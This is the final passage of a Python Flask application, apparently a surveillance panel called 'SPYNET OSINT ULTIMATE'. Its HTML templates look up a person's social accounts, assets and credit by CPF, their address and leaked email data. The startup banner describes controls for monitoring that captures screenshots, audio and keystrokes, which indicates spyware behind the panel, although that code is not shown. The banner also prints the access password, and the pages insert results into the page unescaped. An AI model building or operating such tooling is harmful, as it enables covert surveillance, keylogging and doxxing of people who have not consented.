<div class="card"><h3>➕ ADICIONAR ETAPA</h3><input type="text" id="titulo" placeholder="TÍTULO"><select id="tipo"><option>Identificação</option><option>OSINT</option><option>Patrimonial</option><option>Conclusão</option></select><textarea id="dados" rows="5" placeholder="DADOS"></textarea><button onclick="adicionarEtapa()">➕ SALVAR</button></div>
<script>const CASO_ID = "{{ caso.id }}";async function adicionarEtapa(){const t=document.getElementById('titulo').value,ti=document.getElementById('tipo').value,d=document.getElementById('dados').value;if(!t||!d){alert('Preencha tudo');return}const r=await fetch(`/api/caso/${CASO_ID}/etapa`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({titulo:t,tipo:ti,dados:d})});if((await r.json()).ok)location.reload()}</script>
</body>
</html>
'''

OSINT_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SPYNET — OSINT</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0e1a;font-family:Arial;color:#e8edf5;padding:20px}
.navbar{background:linear-gradient(90deg,#050a12,#0a0e1a);border-bottom:2px solid #00ffcc;padding:15px;margin-bottom:20px}
.logo{font-size:24px;color:#00ffcc}
.btn{background:transparent;border:1px solid #00ffcc;padding:8px 18px;border-radius:4px;text-decoration:none;color:#00ffcc}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px}
.card{background:rgba(0,20,40,0.4);border:1px solid #1a2a3a;border-radius:8px;padding:25px}
.card h2{color:#00ffcc;margin-bottom:15px;font-size:16px}
input{width:100%;padding:12px;margin:10px 0;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#fff}
button{background:#00ffcc;border:none;padding:12px;border-radius:4px;font-weight:bold;cursor:pointer;width:100%}
.resultado-card{background:rgba(0,0,0,0.3);border-left:2px solid #00ffcc;padding:12px;margin-bottom:8px}
.resultado-card a{color:#00ffcc}
.categoria-titulo{color:#ffaa44;margin:15px 0 8px}
</style>
</head>
<body><div class="navbar"><div class="logo">🔍 SPYNET OSINT</div><div><a href="/painel" class="btn">← PAINEL</a></div></div>
<div class="grid">
<div class="card"><h2>🌐 REDES SOCIAIS</h2><input type="text" id="rede_nome" placeholder="Nome"><input type="text" id="rede_username" placeholder="Username"><input type="email" id="rede_email" placeholder="Email"><input type="tel" id="rede_telefone" placeholder="Telefone"><button onclick="buscarRedes()">🔍 BUSCAR</button><div id="rede_resultados"></div></div>
<div class="card"><h2>🏠 BENS</h2><input type="text" id="bens_cpf" placeholder="CPF/CNPJ"><button onclick="buscarBens()">🔍 BUSCAR</button><div id="bens_resultados"></div></div>
<div class="card"><h2>📍 LOCALIZAÇÃO</h2><input type="text" id="local_endereco" placeholder="Endereço"><input type="text" id="local_cep" placeholder="CEP"><input type="text" id="local_cidade" placeholder="Cidade"><button onclick="buscarLocalizacao()">🗺️ LOCALIZAR</button><div id="local_resultados"></div></div>
<div class="card"><h2>📊 CRÉDITO</h2><input type="text" id="credito_cpf" placeholder="CPF"><button onclick="buscarCredito()">📊 ANALISAR</button><div id="credito_resultados"></div></div>
<div class="card"><h2>🔓 VAZAMENTOS</h2><input type="email" id="vazado_email" placeholder="Email"><button onclick="buscarVazamentos()">🔍 VERIFICAR</button><div id="vazado_resultados"></div></div>
</div>
<script>
async function buscarRedes(){const n=document.getElementById('rede_nome').value,u=document.getElementById('rede_username').value,e=document.getElementById('rede_email').value,t=document.getElementById('rede_telefone').value;if(!n&&!u&&!e&&!t){alert('Digite algo');return}const r=await fetch('/osint/redes',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nome:n,username:u,email:e,telefone:t})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`});document.getElementById('rede_resultados').innerHTML=h}
async function buscarBens(){const c=document.getElementById('bens_cpf').value;if(!c){alert('Digite CPF/CNPJ');return}const r=await fetch('/osint/bens',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf_cnpj:c})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`});document.getElementById('bens_resultados').innerHTML=h}
async function buscarLocalizacao(){const e=document.getElementById('local_endereco').value,c=document.getElementById('local_cep').value,ci=document.getElementById('local_cidade').value;if(!e&&!c){alert('Digite endereço ou CEP');return}const r=await fetch('/osint/localizacao',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({endereco:e,cep:c,cidade:ci})});const d=await r.json();document.getElementById('local_resultados').innerHTML=`<div class="resultado-card"><strong>🗺️ MAPS</strong><br><a href="${d.maps_url}" target="_blank">Abrir</a></div><div class="resultado-card"><strong>🚗 WAZE</strong><br><a href="${d.waze_url}" target="_blank">Abrir</a></div>`}
async function buscarCredito(){const c=document.getElementById('credito_cpf').value;if(!c){alert('Digite CPF');return}const r=await fetch('/osint/credito',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cpf:c})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`});document.getElementById('credito_resultados').innerHTML=h}
async function buscarVazamentos(){const e=document.getElementById('vazado_email').value;if(!e){alert('Digite email');return}const r=await fetch('/osint/vazamentos',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})});const d=await r.json();let h='',cat='';d.resultados.forEach(r=>{if(cat!==r.categoria){h+=`<div class="categoria-titulo">${r.categoria}</div>`;cat=r.categoria}h+=`<div class="resultado-card"><strong>${r.titulo}</strong><br><a href="${r.url}" target="_blank">${r.url}</a></div>`});document.getElementById('vazado_resultados').innerHTML=h}
</script>
</body>
</html>
'''

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("=" * 60)
    print("🕵️ SPYNET OSINT ULTIMATE - PAINEL COMPLETO")
    print("=" * 60)
    print(f"🔐 Senha: {SISTEMA_SENHA}")
    print(f"📱 Acesse: http://localhost:{port}")
    print("=" * 60)
    print("✅ Botões disponíveis:")
    print("   ▶️ INICIAR - Começa monitoramento")
    print("   ⏸️ PARAR - Pausa monitoramento")
    print("   🗑️ LIMPAR DADOS - Remove screenshots, áudios e teclas")
    print("   🗑️ LIMPAR CASOS - Remove todos os casos")
    print("=" * 60)
    print("🎤 ÁUDIO: Volume máximo (ganho 12x + compressor)")
    print("=" * 60)
    app.run(host="0.0.0.0", port=port, debug=False)